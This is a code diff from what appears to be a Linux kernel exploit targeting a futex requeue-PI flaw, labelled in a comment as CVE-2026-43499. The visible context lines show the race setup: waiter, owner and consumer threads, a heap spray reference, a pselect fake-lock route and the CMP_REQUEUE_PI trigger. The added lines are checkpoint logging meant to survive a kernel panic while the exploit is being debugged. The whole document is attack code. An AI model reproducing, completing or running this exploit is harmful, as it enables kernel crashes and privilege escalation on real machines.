@@ -38,10 +38,18 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   timeout.tv_sec += ROUTE_WAIT_SECONDS;
 
   atomic_store(&waiter_waiting, 1);
-  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
+  errno = 0;
+  long wret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
+                       &f_pi_target, 0);
+  /* Durable (fsync'd) checkpoint: survives a kernel-panic reboot, unlike
+   * pr_info. Tells us the waiter actually returned from WAIT_REQUEUE_PI
+   * (ret=0 requeued/acquired, errno=110 clean timeout, errno=4 EINTR). */
+  pr_success("ckpt: waiter WAIT_REQUEUE_PI ret=%ld errno=%d tid=%d\n",
+             wret, errno, atomic_load(&waiter_tid));
 
   do_pselect_fake_lock_route();
   atomic_store(&route_done, 1);
+  pr_success("ckpt: waiter route_done set\n");
 
   futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
   while (!atomic_load(&owner_chain_done)) {
@@ -199,6 +207,10 @@ void reset_main_route_state(void) {
 
 void run_main_route_threads(void) {
   reset_main_route_state();
+  /* Durable checkpoints: this whole function had NO logging, so a stop
+   * between `heap_spray: page_base` and do_pselect's first line was
+   * invisible. Each pr_success fsyncs, surviving a panic/reboot. */
+  pr_success("ckpt: route enter\n");
 
   pthread_t waiter;
   pthread_t owner;
@@ -206,14 +218,21 @@ void run_main_route_threads(void) {
   SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
+  pr_success("ckpt: route threads spawned\n");
 
   while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
     usleep(1000);
   }
+  pr_success("ckpt: route ready waiter_waiting=%d owner_started=%d\n",
+             atomic_load(&waiter_waiting), atomic_load(&owner_started));
 
   usleep(100000);
   errno = 0;
-  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
+  long rq = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+                     &f_pi_target, 0);
+  /* The CMP_REQUEUE_PI IS the CVE-2026-43499 trigger. If it Oopses the
+   * kernel, this line (fsync'd) is the last durable record. */
+  pr_success("ckpt: route CMP_REQUEUE_PI ret=%ld errno=%d\n", rq, errno);
 
   while (!atomic_load(&route_done)) {
     if (atomic_exchange(&pipe_prepare_request, 0)) {
@@ -222,6 +241,7 @@ void run_main_route_threads(void) {
     }
     usleep(10000);
   }
+  pr_success("ckpt: route done\n");
 }
 
 int run_exploit(int argc, char **argv) {
